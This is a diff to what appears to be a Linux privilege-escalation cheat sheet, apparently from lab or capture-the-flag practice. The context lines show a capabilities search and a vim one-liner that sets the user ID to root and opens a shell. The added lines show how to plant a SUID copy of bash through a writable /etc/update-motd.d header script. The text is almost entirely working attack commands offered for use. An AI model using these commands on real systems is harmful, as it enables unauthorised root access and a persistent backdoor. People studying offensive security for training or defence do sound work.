@@ -217,3 +217,8 @@ echo "" > --checkpoint=1
 
 getcap -r / 2>/dev/null //Example: -rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/karen/vim
 vim -> :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+WRITABLE DIRECTORY /etc/update-motd.d (update "WELCOME MESSAGE")
+cd /etc/update-motd.d && echo "cp /bin/bash /home/user/bash && chmod u+s /home/user/bash" >> 00-header
